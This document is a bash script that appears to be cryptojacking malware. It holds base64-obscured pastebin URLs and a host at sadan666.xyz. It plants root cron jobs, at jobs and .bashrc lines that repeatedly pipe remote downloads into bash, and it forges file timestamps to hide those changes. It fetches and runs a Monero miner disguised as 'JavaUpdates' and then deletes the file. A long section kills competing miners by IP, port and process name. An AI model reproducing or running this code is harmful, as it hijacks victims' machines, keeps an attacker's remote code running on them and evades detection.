#!/bin/bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
house=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzFlREtIcjRy|base64 -d) # https://pastebin.com/raw/1eDKHr4r
park=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2I1eDFwUnpL|base64 -d) # https://pastebin.com/raw/b5x1pRzK
beam=$(echo c2FkYW42NjYueHl6OjkwODAvcnI=|base64 -d) # sadan666.xyz:9080/rr
deep=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1NqaldldlRz|base64 -d) # https://pastebin.com/raw/SjjWevTs
surf=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3R5am5UUVRB|base64 -d) # https://pastebin.com/raw/tyjnTQTA
me=$( whoami )

function getarch() 
{
	ver="x86_64"
	arch=$(uname -m)
	arch2=$(uname -i)
	arch3=$(getconf LONG_BIT)
	if [ "$arch" == "x86_64" ]; then
		ver="x86_64"
	elif [ "$arch" == "i686" ]; then
		ver="i686"
	elif [ "$arch2" == "x86_64" ]; then
		ver="x86_64"
	elif [ "$arch2" == "i386" ]; then
		ver="i686"
	elif [ "$arch3" == "64" ]; then
		ver="x86_64"
	else
		ver="x86_64"
	fi
	echo $ver
}

ARCH=$(getarch)

function system() 
{
 chattr -i /etc/crontab 
 rm -rf /bin/httpntp /bin/ftpsdns 
 sed -i '/httpntp/d' /etc/crontab 
 sed -i '/ftpsdns/d' /etc/crontab 
 echo -e "(curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" > /bin/httpntp  
 chmod 755 /bin/httpntp 
 if [ ! -f "/etc/crontab" ]; then 
 echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n0 1 * * * root /bin/httpntp\n##" >> /etc/crontab 
 else 
 echo -e "0 1 * * * root /bin/httpntp" >> /etc/crontab 
 fi 
 echo -e "(curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" > /bin/ftpsdns  
 chmod 755 /bin/ftpsdns 
 if [ ! -f "/etc/crontab" ]; then 
 echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n5 1 * * * root /bin/ftpsdns\n##" >> /etc/crontab 
 else 
 echo -e "5 1 * * * root /bin/ftpsdns" >> /etc/crontab 
 fi 
 touch -acmr /bin/sh /etc/crontab 
}

function cronhigh() 
{
 chattr -i /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root 
 rm -rf /etc/cron.hourly/oanacroane /etc/cron.daily/oanacroane /etc/cron.monthly/oanacroane 
 mkdir -p /var/spool/cron/crontabs 
 mkdir -p /etc/cron.hourly 
 mkdir -p /etc/cron.daily 
 mkdir -p /etc/cron.monthly 
 sed -i '/pastebin.com/d' /etc/cron.d/root && sed -i '/##/d' /etc/cron.d/root 
 sed -i '/pastebin.com/d' /etc/cron.d/apache && sed -i '/##/d' /etc/cron.d/apache 
 sed -i '/pastebin.com/d' /etc/cron.d/system && sed -i '/##/d' /etc/cron.d/system 
 sed -i '/pastebin.com/d' /var/spool/cron/crontabs/root && sed -i '/##/d' /var/spool/cron/crontabs/root 
 sed -i '/pastebin.com/d' /var/spool/cron/root && sed -i '/##/d' /var/spool/cron/root 
 key=$( (curl -fsSL $house||wget -q -O - $house) ) 
 echo -e "*/3 * * * * root (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" >> /etc/cron.d/root 
 echo -e "*/6 * * * * root (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" >> /etc/cron.d/system 
 echo -e "*/7 * * * * root (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" >> /etc/cron.d/apache 
 echo -e "*/9 * * * * (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" >> /var/spool/cron/root 
 echo -e "*/11 * * * * (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" >> /var/spool/cron/crontabs/root 
 if [ ! -f "/etc/cron.hourly/oanacroane" ]; then 
 echo $key > /etc/cron.hourly/oanacroane && chmod 755 /etc/cron.hourly/oanacroane 
 fi 
 if [ ! -f "/etc/cron.daily/oanacroane" ]; then 
 echo $key > /etc/cron.daily/oanacroane && chmod 755 /etc/cron.daily/oanacroane 
 fi 
 if [ ! -f "/etc/cron.monthly/oanacroane" ]; then 
 echo $key > /etc/cron.monthly/oanacroane && chmod 755 /etc/cron.monthly/oanacroane 
 fi 
 touch -acmr /bin/sh /var/spool/cron/root 
 touch -acmr /bin/sh /var/spool/cron/crontabs/root 
 touch -acmr /bin/sh /etc/cron.d/system 
 touch -acmr /bin/sh /etc/cron.d/apache 
 touch -acmr /bin/sh /etc/cron.d/root 
 touch -acmr /bin/sh /etc/cron.hourly/oanacroane 
 touch -acmr /bin/sh /etc/cron.daily/oanacroane 
 touch -acmr /bin/sh /etc/cron.monthly/oanacroane 
}

function cronlow() 
{
	cr=$(crontab -l | grep "$house" | wc -l)
	if [ ${cr} -eq 0 ];then
		crontab -r
		(crontab -l 2>/dev/null; echo "*/10 * * * * (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash > /dev/null 2>&1")| crontab -
	else
		echo " "
	fi
}

function cronbackup() 
{
	pay="(curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60||curl -fsSL $house||wget -q -O- $house)|bash"
	status=0
	crona=$(systemctl is-active cron)
	cronb=$(systemctl is-active crond)
	cronatd=$(systemctl is-active atd)
	if [ "$crona" == "active" ] ; then
		status=0
	elif [ "$cronb" == "active"  ]; then
		status=0
	elif [ "$cronatd" == "active" ] ; then
		status=1
	else
		status=2
	fi
	if [ $status -eq 1 ] ; then
		for a in $(at -l|awk '{print $1}'); do at -r $a; done
		echo "$pay" | at -m now + 1 minute
	fi
	if [ $status -eq 2 ] || [ "$me" != "root" ] ;then
		amiup=$(ps -fe|grep 'crun'|grep -v grep|wc -l)
		if [ ${amiup} -ne 0 ] ; then
			ps auxf|grep -v grep|grep "crun" | awk '{print $2}'|xargs kill -9
		fi
		key="while true; do sleep 600 && $pay; done"
		echo -e "$key\n##" > /tmp/crun && chmod 777 /tmp/crun && cd /tmp/
		nohup ./crun >/dev/null 2>&1 &
		sleep 15
		rm /tmp/crun
	fi
}

function cronrc() 
{
	if [ "$me" != "root" ];then
		cron_rc_path="/home/$me/.bashrc"
		pay_rc="(curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60||curl -fsSL $house||wget -q -O- $house)|bash"
	else
		cron_rc_path="/root/.bashrc"
		pay_rc="sed -i '/pastebin.com/d' /etc/hosts;(curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60||curl -fsSL $house||wget -q -O- $house)|bash"
	fi
	if [ -f "$cron_rc_path" ]; then
		sed -i '/pastebin.com/d' $cron_rc_path
		sed -i '/loaded_JavaUpdates_rc/d' $cron_rc_path
		echo -e "$pay_rc\n##loaded_JavaUpdates_rc" >> $cron_rc_path
	fi
}

function gettarfile() 
{
	temp_path="/tmp/.tmpdropoff"
	build_string="/tmp/.tmpdropoff/JavaUpdates"
	if [ "$3" == "-xzf" ];then
		tar_out="/tmp/.tmpdropoff/wwe"
		rig_path="/tmp/.tmpdropoff/dataoutput/xmrig-notls"
	else
		tar_out="/tmp/.tmpdropoff/wwe"
		rig_path="/tmp/.tmpdropoff/dataoutput/xmr-stak"
	fi
	mkdir -p $temp_path/dataoutput/
	cd $temp_path
	(curl -fsSL $2 -o $tar_out||wget -q $2 -O $tar_out)
	base64 -d $tar_out >$build_string
	mv $build_string $3
	cd $1
	rm -rf $temp_path
}

function download() 
{
	pa=$(ps -fe|grep 'JavaUpdates'|grep -v grep|wc -l)
	if [ ${pa} -eq 0 ];then
		mi_64=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0dNZGVXcWVjCg==|base64 -d)
		der_ke=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2RYRDJCczBICg==|base64 -d)
		if [ "$me" != "root" ]; then
			path="/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data"
			if [ -d "$path" ]; then
				rm -rf $path/*
			else
				mkdir -p $path
			fi
		else
			path="/bin"
			rm -rf $path/config.json $path/JavaUpdates
		fi
		cd $path
		if [ "$ARCH" == "x86_64" ]; then
			if [ ! -f "$path/JavaUpdates" ]; then
				gettarfile "$path" "$mi_64" "$path/JavaUpdates"
				chmod 777 $path/JavaUpdates
				nohup ./JavaUpdates >/dev/null 2>&1 &
				sleep 15
				rm -rf $path/JavaUpdates
			else
				nohup ./JavaUpdates >/dev/null 2>&1 &
				sleep 15
				rm -rf $path/JavaUpdates
			fi
		elif [ "$ARCH" == "i686" ]; then
			# if [ ! -f "$path/JavaUpdates" ]; then
				# getencodedfile "$mi_32" "$path/JavaUpdates"
				# chmod 777 $path/JavaUpdates
				# nohup ./JavaUpdates >/dev/null 2>&1 &
			# else
				# nohup ./JavaUpdates >/dev/null 2>&1 &
			# fi
			echo ""
		else
			if [ ! -f "$path/JavaUpdates" ]; then
				gettarfile "$path" "$mi_64" "$path/JavaUpdates"
				chmod 777 $path/JavaUpdates
				nohup ./JavaUpdates >/dev/null 2>&1 &
				sleep 15
				rm -rf $path/JavaUpdates
			else
				nohup ./JavaUpdates >/dev/null 2>&1 &
				sleep 15
				rm -rf $path/JavaUpdates
			fi
		fi
	fi
}

function testa() 
{
	pb=$(ps -fe|grep 'JavaUpdates'|grep -v grep|wc -l)
	if [ ${pb} -eq 0 ];then
		st_64=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0VzY3RmZ3J4Cg==|base64 -d)
		con_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1prejBkOUp6Cg==|base64 -d)
		cpu_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L212U0VHbVI2Cg==|base64 -d)
		poo_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1NCMFRZQnZHCg==|base64 -d)
		if [ "$me" != "root" ]; then
			path="/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data"
			if [ -d "$path" ]; then
				rm -rf $path/*
			else
				mkdir -p $path
			fi
		else
			path="/bin"
			rm -rf $path/config.json $path/JavaUpdates $path/config.txt $path/cpu.txt $path/pools.txt
		fi
		cd $path
		if [ "$ARCH" == "x86_64" ]; then
			if [ ! -f "$path/JavaUpdates" ]; then
				gettarfile "$path" "$st_64" "$path/JavaUpdates"
				chmod 777 $path/JavaUpdates
				nohup ./JavaUpdates >/dev/null 2>&1 &
				sleep 15
				rm -rf $path/JavaUpdates
			else
				nohup ./JavaUpdates >/dev/null 2>&1 &
				sleep 15
				rm -rf $path/JavaUpdates
			fi
		else
			rm -rf $path/cpu.txt $path/pools.txt $path/config.txt
		fi
	fi
}

function finished() 
{
	(curl -fsSL $1 || wget -q -O - $1) && touch /tmp/.tmpc
}


kill_miner_proc()
{
	netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
	netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
	netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :4444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :14433 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'nMrfmnRa' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'PuNY5tm2' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'I0r8Jyyt' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'AgdgACUD' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'uiZvwxG8' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'BtwXn5qH' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '3XEzey2T' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 't2tKrCSZ' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'HD7fcBgg' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'zXcDajSs' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '3lmigMo' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'AkMK4A2' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'AJ2AkKe' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'HiPxCJRS' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'http_0xCC030' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'http_0xCC031' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'http_0xCC032' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'http_0xCC033' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "C4iLM4L" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "rkebbwgqpl4npmm" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "0kwti6ut420t" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "158.69.133.18:8220" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "kieuanilam.me" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
	netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
	netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
	pgrep -f monerohash | xargs -I % kill -9 %
	pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
	pgrep -f xzpauectgr | xargs -I % kill -9 %
	pgrep -f slxfbkmxtd | xargs -I % kill -9 %
	pgrep -f mixtape | xargs -I % kill -9 %
	pgrep -f addnj | xargs -I % kill -9 %
	pgrep -f 200.68.17.196 | xargs -I % kill -9 %
	pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % kill -9 %
	pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % kill -9 %
	pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % kill -9 %
	pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % kill -9 %
	pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
	pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
	pgrep -f mqdsflm.cf | xargs -I % kill -9 %
	pgrep -f stratum | xargs -I % kill -9 %
	pgrep -f lower.sh | xargs -I % kill -9 %
	pgrep -f ./ppp | xargs -I % kill -9 %
	pgrep -f cryptonight | xargs -I % kill -9 %
	pgrep -f ./seervceaess | xargs -I % kill -9 %
	pgrep -f ./servceaess | xargs -I % kill -9 %
	pgrep -f ./servceas | xargs -I % kill -9 %
	pgrep -f ./servcesa | xargs -I % kill -9 %
	pgrep -f ./vsp | xargs -I % kill -9 %
	pgrep -f ./jvs | xargs -I % kill -9 %
	pgrep -f ./pvv | xargs -I % kill -9 %
	pgrep -f ./vpp | xargs -I % kill -9 %
	pgrep -f ./pces | xargs -I % kill -9 %
	pgrep -f ./rspce | xargs -I % kill -9 %
	pgrep -f ./haveged | xargs -I % kill -9 %
	pgrep -f ./jiba | xargs -I % kill -9 %
	pgrep -f ./watchbog | xargs -I % kill -9 %
	pgrep -f ./A7mA5gb | xargs -I % kill -9 %
	pgrep -f kacpi_svc | xargs -I % kill -9 %
	pgrep -f kswap_svc | xargs -I % kill -9 %
	pgrep -f kauditd_svc | xargs -I % kill -9 %
	pgrep -f kpsmoused_svc | xargs -I % kill -9 %
